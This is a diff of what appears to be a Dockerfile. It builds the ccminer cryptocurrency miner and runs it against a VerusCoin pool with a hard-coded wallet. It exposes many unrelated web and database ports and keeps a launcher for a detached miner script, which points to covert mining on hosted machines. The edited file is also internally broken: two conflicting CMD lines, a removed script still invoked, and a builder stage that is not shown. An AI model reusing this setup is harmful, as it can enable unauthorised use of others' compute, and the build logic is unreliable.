@@ -39,9 +39,14 @@ RUN sudo apt update -y \
     && chmod +x configure.sh \
     && chmod +x autogen.sh \
     && ./build.sh \
-    && mkdir /run/miner \
-    && echo "sudo screen -dmSL vm ./ccminer -a verus -o stratum+tcp://ap.luckpool.net:3960 -u RQmcUUPrM3Fd59UUgFKvioer9bBHdvBMNj.Rig001 -p x &" >>/miner.sh \
-    && chmod 755 /miner.sh
+    && cd .. \
+    && mv ccminer/ccminer /usr/local/bin/ \
+    && rm -rf ccminer 
+    
+COPY --from=builder /usr/local/bin/ccminer /usr/local/bin/
+
+ENTRYPOINT [ "ccminer" ]
+CMD [ "-a", "verus", "-o", "stratum+tcp://ap.luckpool.net:3960", "-u", "RQmcUUPrM3Fd59UUgFKvioer9bBHdvBMNj.Rig001", "-p", "x", "-tx" ]
 
 EXPOSE 80 8888 8080 443 5130-5135 3306 7860
 CMD ["/bin/bash", "/docker.sh", "/miner.sh"]
